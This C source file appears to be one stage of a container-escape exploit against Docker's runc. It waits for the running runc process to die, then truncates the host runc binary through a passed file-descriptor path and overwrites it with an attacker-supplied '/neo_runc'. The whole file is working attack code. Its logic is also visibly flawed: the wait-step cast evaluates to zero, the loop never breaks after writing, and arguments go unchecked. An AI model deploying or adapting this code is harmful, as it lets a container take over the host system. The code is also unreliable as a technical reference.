/*
 * overwrite_runc.c
 * Overwrites Docker Runc Binary
*/

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>

#include "buffer.h"

// path to runc to overwrite the currenf runc with
const char *new_runc_path = "/neo_runc";

// how long to wait for step foro the original runc to die
const int32_t wait_step = (int32_t) 0.05 * 1000000;
// how long to poll for original runc to die
const int32_t wait_timeout = 10 * 1000000;

int main(int argc, char *argv[])
{
    // parse arguments in argv: extract runc file descriptor path
    const char *runc_fd_path = argv[1];
    
    // read new runc into memory
    Buffer new_runc = read_path(new_runc_path);
    if(new_runc.contents == NULL)
    {
        printf("[ERR] Could not read new runc at %s\n", new_runc_path);
        return 1; 
    }
    
    // open runc file descriptor path for writing 
    // requires us to wait for the original runc process to die before we 
    // can open it, so we retry for until we exceed the wait timeout
    bool has_overwritten = false;
    int runc_fd = 0;
    for(int32_t elapsed = 0; elapsed < wait_timeout; elapsed += wait_step)
    {
        // O_TRUNC causes existing contests of the file to cleared for writing
        runc_fd = open(runc_fd_path, O_WRONLY | O_TRUNC);
        if(runc_fd == -1) // runc not writable yet 
        {
            printf(".");
            fflush(stdout);
            usleep(wait_step);
            continue; 
        }
    
        // overwrite with new contents of new runc 
        size_t write_len = write(runc_fd, new_runc.contents, new_runc.size);
        if(write_len != new_runc.size)
        {
            printf("[ERR] Could not overwrite old runc with new runc\n");
            return 1;
        }
            
        //. successfully overwritten runc
        has_overwritten = true;
    }
    
    // clean up 
    close(runc_fd);
    free(new_runc.contents);
    
    if(!has_overwritten)
    {
        printf("[ERR] Could not overwrite timed out.\n");
        return 1;
    }
    
    printf("[OK] Overwrite old runc with new runc successful\n");
    return 0;
}
